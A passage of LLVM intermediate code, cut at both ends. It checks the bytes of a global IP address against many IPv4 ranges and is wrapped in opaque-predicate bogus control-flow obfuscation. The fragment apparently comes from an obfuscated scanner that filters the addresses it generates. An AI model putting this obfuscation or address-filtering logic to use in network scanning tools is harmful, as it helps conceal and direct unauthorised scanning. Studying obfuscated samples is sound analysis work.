  %1511 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %1512 = zext i8 %1511 to i32
  %1513 = icmp eq i32 %1512, 147
  br i1 %1513, label %1514, label %1538

; <label>:1514:                                   ; preds = %1510
  %1515 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %1516 = zext i8 %1515 to i32
  %1517 = icmp sge i32 %1516, 168
  br i1 %1517, label %1518, label %1538

; <label>:1518:                                   ; preds = %1514
  %1519 = load i32, i32* @x.65
  %1520 = load i32, i32* @y.66
  %1521 = sub i32 %1519, 1
  %1522 = mul i32 %1519, %1521
  %1523 = urem i32 %1522, 2
  %1524 = icmp eq i32 %1523, 0
  %1525 = icmp slt i32 %1520, 10
  %1526 = or i1 %1524, %1525
  br i1 %1526, label %originalBB210, label %originalBB210alteredBB

originalBB210:                                    ; preds = %originalBB210alteredBB, %1518
  %1527 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %1528 = zext i8 %1527 to i32
  %1529 = icmp slt i32 %1528, 170
  %1530 = load i32, i32* @x.65
  %1531 = load i32, i32* @y.66
  %1532 = sub i32 %1530, 1
  %1533 = mul i32 %1530, %1532
  %1534 = urem i32 %1533, 2
  %1535 = icmp eq i32 %1534, 0
  %1536 = icmp slt i32 %1531, 10
  %1537 = or i1 %1535, %1536
  br i1 %1537, label %originalBBpart2212, label %originalBB210alteredBB

originalBBpart2212:                               ; preds = %originalBB210
  br i1 %1529, label %5298, label %1538

; <label>:1538:                                   ; preds = %originalBBpart2212, %1514, %1510
  %1539 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %1540 = zext i8 %1539 to i32
  %1541 = icmp eq i32 %1540, 147
  br i1 %1541, label %1542, label %1550

; <label>:1542:                                   ; preds = %1538
  %1543 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %1544 = zext i8 %1543 to i32
  %1545 = icmp sge i32 %1544, 198
  br i1 %1545, label %1546, label %1550

; <label>:1546:                                   ; preds = %1542
  %1547 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %1548 = zext i8 %1547 to i32
  %1549 = icmp slt i32 %1548, 200
  br i1 %1549, label %5298, label %1550

; <label>:1550:                                   ; preds = %1546, %1542, %1538
  %1551 = load i32, i32* @x.65
  %1552 = load i32, i32* @y.66
  %1553 = sub i32 %1551, 1
  %1554 = mul i32 %1551, %1553
  %1555 = urem i32 %1554, 2
  %1556 = icmp eq i32 %1555, 0
  %1557 = icmp slt i32 %1552, 10
  %1558 = or i1 %1556, %1557
  br i1 %1558, label %originalBB214, label %originalBB214alteredBB

originalBB214:                                    ; preds = %originalBB214alteredBB, %1550
  %1559 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %1560 = zext i8 %1559 to i32
  %1561 = icmp eq i32 %1560, 147
  %1562 = load i32, i32* @x.65
  %1563 = load i32, i32* @y.66
  %1564 = sub i32 %1562, 1
  %1565 = mul i32 %1562, %1564
  %1566 = urem i32 %1565, 2
  %1567 = icmp eq i32 %1566, 0
  %1568 = icmp slt i32 %1563, 10
  %1569 = or i1 %1567, %1568
  br i1 %1569, label %originalBBpart2216, label %originalBB214alteredBB

originalBBpart2216:                               ; preds = %originalBB214
  br i1 %1561, label %1570, label %1594

; <label>:1570:                                   ; preds = %originalBBpart2216
  %1571 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %1572 = zext i8 %1571 to i32
  %1573 = icmp sge i32 %1572, 238
  br i1 %1573, label %1574, label %1594

; <label>:1574:                                   ; preds = %1570
  %1575 = load i32, i32* @x.65
  %1576 = load i32, i32* @y.66
  %1577 = sub i32 %1575, 1
  %1578 = mul i32 %1575, %1577
  %1579 = urem i32 %1578, 2
  %1580 = icmp eq i32 %1579, 0
  %1581 = icmp slt i32 %1576, 10
  %1582 = or i1 %1580, %1581
  br i1 %1582, label %originalBB218, label %originalBB218alteredBB

originalBB218:                                    ; preds = %originalBB218alteredBB, %1574
  %1583 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %1584 = zext i8 %1583 to i32
  %1585 = icmp slt i32 %1584, 255
  %1586 = load i32, i32* @x.65
  %1587 = load i32, i32* @y.66
  %1588 = sub i32 %1586, 1
  %1589 = mul i32 %1586, %1588
  %1590 = urem i32 %1589, 2
  %1591 = icmp eq i32 %1590, 0
  %1592 = icmp slt i32 %1587, 10
  %1593 = or i1 %1591, %1592
  br i1 %1593, label %originalBBpart2220, label %originalBB218alteredBB

originalBBpart2220:                               ; preds = %originalBB218
  br i1 %1585, label %5298, label %1594

; <label>:1594:                                   ; preds = %originalBBpart2220, %1570, %originalBBpart2216
  %1595 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %1596 = zext i8 %1595 to i32
  %1597 = icmp eq i32 %1596, 150
  br i1 %1597, label %1598, label %1622

; <label>:1598:                                   ; preds = %1594
  %1599 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %1600 = zext i8 %1599 to i32
  %1601 = icmp sge i32 %1600, 113
  br i1 %1601, label %1602, label %1622

; <label>:1602:                                   ; preds = %1598
  %1603 = load i32, i32* @x.65
  %1604 = load i32, i32* @y.66
  %1605 = sub i32 %1603, 1
  %1606 = mul i32 %1603, %1605
  %1607 = urem i32 %1606, 2
  %1608 = icmp eq i32 %1607, 0
  %1609 = icmp slt i32 %1604, 10
  %1610 = or i1 %1608, %1609
  br i1 %1610, label %originalBB222, label %originalBB222alteredBB

originalBB222:                                    ; preds = %originalBB222alteredBB, %1602
  %1611 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %1612 = zext i8 %1611 to i32
  %1613 = icmp slt i32 %1612, 115
  %1614 = load i32, i32* @x.65
  %1615 = load i32, i32* @y.66
  %1616 = sub i32 %1614, 1
  %1617 = mul i32 %1614, %1616
  %1618 = urem i32 %1617, 2
  %1619 = icmp eq i32 %1618, 0
  %1620 = icmp slt i32 %1615, 10
  %1621 = or i1 %1619, %1620
  br i1 %1621, label %originalBBpart2224, label %originalBB222alteredBB

originalBBpart2224:                               ; preds = %originalBB222
  br i1 %1613, label %5298, label %1622

; <label>:1622:                                   ; preds = %originalBBpart2224, %1598, %1594
  %1623 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %1624 = zext i8 %1623 to i32
  %1625 = icmp eq i32 %1624, 152
  br i1 %1625, label %1626, label %1634

; <label>:1626:                                   ; preds = %1622
  %1627 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %1628 = zext i8 %1627 to i32
  %1629 = icmp sge i32 %1628, 151
  br i1 %1629, label %1630, label %1634

; <label>:1630:                                   ; preds = %1626
  %1631 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %1632 = zext i8 %1631 to i32
  %1633 = icmp slt i32 %1632, 155
  br i1 %1633, label %5298, label %1634

; <label>:1634:                                   ; preds = %1630, %1626, %1622
  %1635 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %1636 = zext i8 %1635 to i32
  %1637 = icmp eq i32 %1636, 153
  br i1 %1637, label %1638, label %1662

; <label>:1638:                                   ; preds = %1634
  %1639 = load i32, i32* @x.65
  %1640 = load i32, i32* @y.66
  %1641 = sub i32 %1639, 1
  %1642 = mul i32 %1639, %1641
  %1643 = urem i32 %1642, 2
  %1644 = icmp eq i32 %1643, 0
  %1645 = icmp slt i32 %1640, 10
  %1646 = or i1 %1644, %1645
  br i1 %1646, label %originalBB226, label %originalBB226alteredBB

originalBB226:                                    ; preds = %originalBB226alteredBB, %1638
  %1647 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %1648 = zext i8 %1647 to i32
  %1649 = icmp sge i32 %1648, 21
  %1650 = load i32, i32* @x.65
  %1651 = load i32, i32* @y.66
  %1652 = sub i32 %1650, 1
  %1653 = mul i32 %1650, %1652
  %1654 = urem i32 %1653, 2
  %1655 = icmp eq i32 %1654, 0
  %1656 = icmp slt i32 %1651, 10
  %1657 = or i1 %1655, %1656
  br i1 %1657, label %originalBBpart2228, label %originalBB226alteredBB

originalBBpart2228:                               ; preds = %originalBB226
  br i1 %1649, label %1658, label %1662

; <label>:1658:                                   ; preds = %originalBBpart2228
  %1659 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %1660 = zext i8 %1659 to i32
  %1661 = icmp slt i32 %1660, 32
  br i1 %1661, label %5298, label %1662

; <label>:1662:                                   ; preds = %1658, %originalBBpart2228, %1634
  %1663 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %1664 = zext i8 %1663 to i32
  %1665 = icmp eq i32 %1664, 155
  br i1 %1665, label %1666, label %1674

; <label>:1666:                                   ; preds = %1662
  %1667 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %1668 = zext i8 %1667 to i32
  %1669 = icmp sge i32 %1668, 5
  br i1 %1669, label %1670, label %1674

; <label>:1670:                                   ; preds = %1666
  %1671 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %1672 = zext i8 %1671 to i32
  %1673 = icmp slt i32 %1672, 10
  br i1 %1673, label %5298, label %1674

; <label>:1674:                                   ; preds = %1670, %1666, %1662
  %1675 = load i32, i32* @x.65
  %1676 = load i32, i32* @y.66
  %1677 = sub i32 %1675, 1
  %1678 = mul i32 %1675, %1677
  %1679 = urem i32 %1678, 2
  %1680 = icmp eq i32 %1679, 0
  %1681 = icmp slt i32 %1676, 10
  %1682 = or i1 %1680, %1681
  br i1 %1682, label %originalBB230, label %originalBB230alteredBB

originalBB230:                                    ; preds = %originalBB230alteredBB, %1674
  %1683 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %1684 = zext i8 %1683 to i32
  %1685 = icmp eq i32 %1684, 155
  %1686 = load i32, i32* @x.65
  %1687 = load i32, i32* @y.66
  %1688 = sub i32 %1686, 1
  %1689 = mul i32 %1686, %1688
  %1690 = urem i32 %1689, 2
  %1691 = icmp eq i32 %1690, 0
  %1692 = icmp slt i32 %1687, 10
  %1693 = or i1 %1691, %1692
  br i1 %1693, label %originalBBpart2232, label %originalBB230alteredBB

originalBBpart2232:                               ; preds = %originalBB230
  br i1 %1685, label %1694, label %1734

; <label>:1694:                                   ; preds = %originalBBpart2232
  %1695 = load i32, i32* @x.65
  %1696 = load i32, i32* @y.66
  %1697 = sub i32 %1695, 1
  %1698 = mul i32 %1695, %1697
  %1699 = urem i32 %1698, 2
  %1700 = icmp eq i32 %1699, 0
  %1701 = icmp slt i32 %1696, 10
  %1702 = or i1 %1700, %1701
  br i1 %1702, label %originalBB234, label %originalBB234alteredBB

originalBB234:                                    ; preds = %originalBB234alteredBB, %1694
  %1703 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %1704 = zext i8 %1703 to i32
  %1705 = icmp sge i32 %1704, 74
  %1706 = load i32, i32* @x.65
  %1707 = load i32, i32* @y.66
  %1708 = sub i32 %1706, 1
  %1709 = mul i32 %1706, %1708
  %1710 = urem i32 %1709, 2
  %1711 = icmp eq i32 %1710, 0
  %1712 = icmp slt i32 %1707, 10
  %1713 = or i1 %1711, %1712
  br i1 %1713, label %originalBBpart2236, label %originalBB234alteredBB

originalBBpart2236:                               ; preds = %originalBB234
  br i1 %1705, label %1714, label %1734

; <label>:1714:                                   ; preds = %originalBBpart2236
  %1715 = load i32, i32* @x.65
  %1716 = load i32, i32* @y.66
  %1717 = sub i32 %1715, 1
  %1718 = mul i32 %1715, %1717
  %1719 = urem i32 %1718, 2
  %1720 = icmp eq i32 %1719, 0
  %1721 = icmp slt i32 %1716, 10
  %1722 = or i1 %1720, %1721
  br i1 %1722, label %originalBB238, label %originalBB238alteredBB

originalBB238:                                    ; preds = %originalBB238alteredBB, %1714
  %1723 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %1724 = zext i8 %1723 to i32
  %1725 = icmp slt i32 %1724, 89
  %1726 = load i32, i32* @x.65
  %1727 = load i32, i32* @y.66
  %1728 = sub i32 %1726, 1
  %1729 = mul i32 %1726, %1728
  %1730 = urem i32 %1729, 2
  %1731 = icmp eq i32 %1730, 0
  %1732 = icmp slt i32 %1727, 10
  %1733 = or i1 %1731, %1732
  br i1 %1733, label %originalBBpart2240, label %originalBB238alteredBB

originalBBpart2240:                               ; preds = %originalBB238
  br i1 %1725, label %5298, label %1734

; <label>:1734:                                   ; preds = %originalBBpart2240, %originalBBpart2236, %originalBBpart2232
  %1735 = load i32, i32* @x.65
  %1736 = load i32, i32* @y.66
  %1737 = sub i32 %1735, 1
  %1738 = mul i32 %1735, %1737
  %1739 = urem i32 %1738, 2
  %1740 = icmp eq i32 %1739, 0
  %1741 = icmp slt i32 %1736, 10
  %1742 = or i1 %1740, %1741
  br i1 %1742, label %originalBB242, label %originalBB242alteredBB

originalBB242:                                    ; preds = %originalBB242alteredBB, %1734
  %1743 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %1744 = zext i8 %1743 to i32
  %1745 = icmp eq i32 %1744, 155
  %1746 = load i32, i32* @x.65
  %1747 = load i32, i32* @y.66
  %1748 = sub i32 %1746, 1
  %1749 = mul i32 %1746, %1748
  %1750 = urem i32 %1749, 2
  %1751 = icmp eq i32 %1750, 0
  %1752 = icmp slt i32 %1747, 10
  %1753 = or i1 %1751, %1752
  br i1 %1753, label %originalBBpart2244, label %originalBB242alteredBB

originalBBpart2244:                               ; preds = %originalBB242
  br i1 %1745, label %1754, label %1778

; <label>:1754:                                   ; preds = %originalBBpart2244
  %1755 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %1756 = zext i8 %1755 to i32
  %1757 = icmp sge i32 %1756, 213
  br i1 %1757, label %1758, label %1778

; <label>:1758:                                   ; preds = %1754
  %1759 = load i32, i32* @x.65
  %1760 = load i32, i32* @y.66
  %1761 = sub i32 %1759, 1
  %1762 = mul i32 %1759, %1761
  %1763 = urem i32 %1762, 2
  %1764 = icmp eq i32 %1763, 0
  %1765 = icmp slt i32 %1760, 10
  %1766 = or i1 %1764, %1765
  br i1 %1766, label %originalBB246, label %originalBB246alteredBB

originalBB246:                                    ; preds = %originalBB246alteredBB, %1758
  %1767 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %1768 = zext i8 %1767 to i32
  %1769 = icmp slt i32 %1768, 222
  %1770 = load i32, i32* @x.65
  %1771 = load i32, i32* @y.66
  %1772 = sub i32 %1770, 1
  %1773 = mul i32 %1770, %1772
  %1774 = urem i32 %1773, 2
  %1775 = icmp eq i32 %1774, 0
  %1776 = icmp slt i32 %1771, 10
  %1777 = or i1 %1775, %1776
  br i1 %1777, label %originalBBpart2248, label %originalBB246alteredBB

originalBBpart2248:                               ; preds = %originalBB246
  br i1 %1769, label %5298, label %1778

; <label>:1778:                                   ; preds = %originalBBpart2248, %1754, %originalBBpart2244
  %1779 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %1780 = zext i8 %1779 to i32
  %1781 = icmp eq i32 %1780, 157
  br i1 %1781, label %1782, label %1806

; <label>:1782:                                   ; preds = %1778
  %1783 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %1784 = zext i8 %1783 to i32
  %1785 = icmp sge i32 %1784, 150
  br i1 %1785, label %1786, label %1806

; <label>:1786:                                   ; preds = %1782
  %1787 = load i32, i32* @x.65
  %1788 = load i32, i32* @y.66
  %1789 = sub i32 %1787, 1
  %1790 = mul i32 %1787, %1789
  %1791 = urem i32 %1790, 2
  %1792 = icmp eq i32 %1791, 0
  %1793 = icmp slt i32 %1788, 10
  %1794 = or i1 %1792, %1793
  br i1 %1794, label %originalBB250, label %originalBB250alteredBB

originalBB250:                                    ; preds = %originalBB250alteredBB, %1786
  %1795 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %1796 = zext i8 %1795 to i32
  %1797 = icmp slt i32 %1796, 154
  %1798 = load i32, i32* @x.65
  %1799 = load i32, i32* @y.66
  %1800 = sub i32 %1798, 1
  %1801 = mul i32 %1798, %1800
  %1802 = urem i32 %1801, 2
  %1803 = icmp eq i32 %1802, 0
  %1804 = icmp slt i32 %1799, 10
  %1805 = or i1 %1803, %1804
  br i1 %1805, label %originalBBpart2252, label %originalBB250alteredBB

originalBBpart2252:                               ; preds = %originalBB250
  br i1 %1797, label %5298, label %1806

; <label>:1806:                                   ; preds = %originalBBpart2252, %1782, %1778
  %1807 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %1808 = zext i8 %1807 to i32
  %1809 = icmp eq i32 %1808, 158
  br i1 %1809, label %1810, label %1834

; <label>:1810:                                   ; preds = %1806
  %1811 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %1812 = zext i8 %1811 to i32
  %1813 = icmp sge i32 %1812, 1
  br i1 %1813, label %1814, label %1834

; <label>:1814:                                   ; preds = %1810
  %1815 = load i32, i32* @x.65
  %1816 = load i32, i32* @y.66
  %1817 = sub i32 %1815, 1
  %1818 = mul i32 %1815, %1817
  %1819 = urem i32 %1818, 2
  %1820 = icmp eq i32 %1819, 0
  %1821 = icmp slt i32 %1816, 10
  %1822 = or i1 %1820, %1821
  br i1 %1822, label %originalBB254, label %originalBB254alteredBB

originalBB254:                                    ; preds = %originalBB254alteredBB, %1814
  %1823 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %1824 = zext i8 %1823 to i32
  %1825 = icmp slt i32 %1824, 21
  %1826 = load i32, i32* @x.65
  %1827 = load i32, i32* @y.66
  %1828 = sub i32 %1826, 1
  %1829 = mul i32 %1826, %1828
  %1830 = urem i32 %1829, 2
  %1831 = icmp eq i32 %1830, 0
  %1832 = icmp slt i32 %1827, 10
  %1833 = or i1 %1831, %1832
  br i1 %1833, label %originalBBpart2256, label %originalBB254alteredBB

originalBBpart2256:                               ; preds = %originalBB254
  br i1 %1825, label %5298, label %1834

; <label>:1834:                                   ; preds = %originalBBpart2256, %1810, %1806
  %1835 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %1836 = zext i8 %1835 to i32
  %1837 = icmp eq i32 %1836, 158
  br i1 %1837, label %1838, label %1846

; <label>:1838:                                   ; preds = %1834
  %1839 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %1840 = zext i8 %1839 to i32
  %1841 = icmp sge i32 %1840, 235
  br i1 %1841, label %1842, label %1846

; <label>:1842:                                   ; preds = %1838
  %1843 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %1844 = zext i8 %1843 to i32
  %1845 = icmp slt i32 %1844, 247
  br i1 %1845, label %5298, label %1846

; <label>:1846:                                   ; preds = %1842, %1838, %1834
  %1847 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %1848 = zext i8 %1847 to i32
  %1849 = icmp eq i32 %1848, 159
  br i1 %1849, label %1850, label %1858

; <label>:1850:                                   ; preds = %1846
  %1851 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %1852 = zext i8 %1851 to i32
  %1853 = icmp sge i32 %1852, 120
  br i1 %1853, label %1854, label %1858

; <label>:1854:                                   ; preds = %1850
  %1855 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %1856 = zext i8 %1855 to i32
  %1857 = icmp slt i32 %1856, 121
  br i1 %1857, label %5298, label %1858

; <label>:1858:                                   ; preds = %1854, %1850, %1846
  %1859 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %1860 = zext i8 %1859 to i32
  %1861 = icmp eq i32 %1860, 160
  br i1 %1861, label %1862, label %1886

; <label>:1862:                                   ; preds = %1858
  %1863 = load i32, i32* @x.65
  %1864 = load i32, i32* @y.66
  %1865 = sub i32 %1863, 1
  %1866 = mul i32 %1863, %1865
  %1867 = urem i32 %1866, 2
  %1868 = icmp eq i32 %1867, 0
  %1869 = icmp slt i32 %1864, 10
  %1870 = or i1 %1868, %1869
  br i1 %1870, label %originalBB258, label %originalBB258alteredBB

originalBB258:                                    ; preds = %originalBB258alteredBB, %1862
  %1871 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %1872 = zext i8 %1871 to i32
  %1873 = icmp sge i32 %1872, 132
  %1874 = load i32, i32* @x.65
  %1875 = load i32, i32* @y.66
  %1876 = sub i32 %1874, 1
  %1877 = mul i32 %1874, %1876
  %1878 = urem i32 %1877, 2
  %1879 = icmp eq i32 %1878, 0
  %1880 = icmp slt i32 %1875, 10
  %1881 = or i1 %1879, %1880
  br i1 %1881, label %originalBBpart2260, label %originalBB258alteredBB

originalBBpart2260:                               ; preds = %originalBB258
  br i1 %1873, label %1882, label %1886

; <label>:1882:                                   ; preds = %originalBBpart2260
  %1883 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %1884 = zext i8 %1883 to i32
  %1885 = icmp slt i32 %1884, 151
  br i1 %1885, label %5298, label %1886

; <label>:1886:                                   ; preds = %1882, %originalBBpart2260, %1858
  %1887 = load i32, i32* @x.65
  %1888 = load i32, i32* @y.66
  %1889 = sub i32 %1887, 1
  %1890 = mul i32 %1887, %1889
  %1891 = urem i32 %1890, 2
  %1892 = icmp eq i32 %1891, 0
  %1893 = icmp slt i32 %1888, 10
  %1894 = or i1 %1892, %1893
  br i1 %1894, label %originalBB262, label %originalBB262alteredBB

originalBB262:                                    ; preds = %originalBB262alteredBB, %1886
  %1895 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %1896 = zext i8 %1895 to i32
  %1897 = icmp eq i32 %1896, 64
  %1898 = load i32, i32* @x.65
  %1899 = load i32, i32* @y.66
  %1900 = sub i32 %1898, 1
  %1901 = mul i32 %1898, %1900
  %1902 = urem i32 %1901, 2
  %1903 = icmp eq i32 %1902, 0
  %1904 = icmp slt i32 %1899, 10
  %1905 = or i1 %1903, %1904
  br i1 %1905, label %originalBBpart2264, label %originalBB262alteredBB

originalBBpart2264:                               ; preds = %originalBB262
  br i1 %1897, label %1906, label %1914

; <label>:1906:                                   ; preds = %originalBBpart2264
  %1907 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %1908 = zext i8 %1907 to i32
  %1909 = icmp sge i32 %1908, 224
  br i1 %1909, label %1910, label %1914

; <label>:1910:                                   ; preds = %1906
  %1911 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %1912 = zext i8 %1911 to i32
  %1913 = icmp slt i32 %1912, 227
  br i1 %1913, label %5298, label %1914

; <label>:1914:                                   ; preds = %1910, %1906, %originalBBpart2264
  %1915 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %1916 = zext i8 %1915 to i32
  %1917 = icmp eq i32 %1916, 162
  br i1 %1917, label %1918, label %1942

; <label>:1918:                                   ; preds = %1914
  %1919 = load i32, i32* @x.65
  %1920 = load i32, i32* @y.66
  %1921 = sub i32 %1919, 1
  %1922 = mul i32 %1919, %1921
  %1923 = urem i32 %1922, 2
  %1924 = icmp eq i32 %1923, 0
  %1925 = icmp slt i32 %1920, 10
  %1926 = or i1 %1924, %1925
  br i1 %1926, label %originalBB266, label %originalBB266alteredBB

originalBB266:                                    ; preds = %originalBB266alteredBB, %1918
  %1927 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %1928 = zext i8 %1927 to i32
  %1929 = icmp sge i32 %1928, 45
  %1930 = load i32, i32* @x.65
  %1931 = load i32, i32* @y.66
  %1932 = sub i32 %1930, 1
  %1933 = mul i32 %1930, %1932
  %1934 = urem i32 %1933, 2
  %1935 = icmp eq i32 %1934, 0
  %1936 = icmp slt i32 %1931, 10
  %1937 = or i1 %1935, %1936
  br i1 %1937, label %originalBBpart2268, label %originalBB266alteredBB

originalBBpart2268:                               ; preds = %originalBB266
  br i1 %1929, label %1938, label %1942

; <label>:1938:                                   ; preds = %originalBBpart2268
  %1939 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %1940 = zext i8 %1939 to i32
  %1941 = icmp slt i32 %1940, 47
  br i1 %1941, label %5298, label %1942

; <label>:1942:                                   ; preds = %1938, %originalBBpart2268, %1914
  %1943 = load i32, i32* @x.65
  %1944 = load i32, i32* @y.66
  %1945 = sub i32 %1943, 1
  %1946 = mul i32 %1943, %1945
  %1947 = urem i32 %1946, 2
  %1948 = icmp eq i32 %1947, 0
  %1949 = icmp slt i32 %1944, 10
  %1950 = or i1 %1948, %1949
  br i1 %1950, label %originalBB270, label %originalBB270alteredBB

originalBB270:                                    ; preds = %originalBB270alteredBB, %1942
  %1951 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %1952 = zext i8 %1951 to i32
  %1953 = icmp eq i32 %1952, 163
  %1954 = load i32, i32* @x.65
  %1955 = load i32, i32* @y.66
  %1956 = sub i32 %1954, 1
  %1957 = mul i32 %1954, %1956
  %1958 = urem i32 %1957, 2
  %1959 = icmp eq i32 %1958, 0
  %1960 = icmp slt i32 %1955, 10
  %1961 = or i1 %1959, %1960
  br i1 %1961, label %originalBBpart2272, label %originalBB270alteredBB

originalBBpart2272:                               ; preds = %originalBB270
  br i1 %1953, label %1962, label %1970

; <label>:1962:                                   ; preds = %originalBBpart2272
  %1963 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %1964 = zext i8 %1963 to i32
  %1965 = icmp sge i32 %1964, 205
  br i1 %1965, label %1966, label %1970

; <label>:1966:                                   ; preds = %1962
  %1967 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %1968 = zext i8 %1967 to i32
  %1969 = icmp slt i32 %1968, 207
  br i1 %1969, label %5298, label %1970

; <label>:1970:                                   ; preds = %1966, %1962, %originalBBpart2272
  %1971 = load i32, i32* @x.65
  %1972 = load i32, i32* @y.66
  %1973 = sub i32 %1971, 1
  %1974 = mul i32 %1971, %1973
  %1975 = urem i32 %1974, 2
  %1976 = icmp eq i32 %1975, 0
  %1977 = icmp slt i32 %1972, 10
  %1978 = or i1 %1976, %1977
  br i1 %1978, label %originalBB274, label %originalBB274alteredBB

originalBB274:                                    ; preds = %originalBB274alteredBB, %1970
  %1979 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %1980 = zext i8 %1979 to i32
  %1981 = icmp eq i32 %1980, 164
  %1982 = load i32, i32* @x.65
  %1983 = load i32, i32* @y.66
  %1984 = sub i32 %1982, 1
  %1985 = mul i32 %1982, %1984
  %1986 = urem i32 %1985, 2
  %1987 = icmp eq i32 %1986, 0
  %1988 = icmp slt i32 %1983, 10
  %1989 = or i1 %1987, %1988
  br i1 %1989, label %originalBBpart2276, label %originalBB274alteredBB

originalBBpart2276:                               ; preds = %originalBB274
  br i1 %1981, label %1990, label %1998

; <label>:1990:                                   ; preds = %originalBBpart2276
  %1991 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %1992 = zext i8 %1991 to i32
  %1993 = icmp sge i32 %1992, 45
  br i1 %1993, label %1994, label %1998

; <label>:1994:                                   ; preds = %1990
  %1995 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %1996 = zext i8 %1995 to i32
  %1997 = icmp slt i32 %1996, 50
  br i1 %1997, label %5298, label %1998

; <label>:1998:                                   ; preds = %1994, %1990, %originalBBpart2276
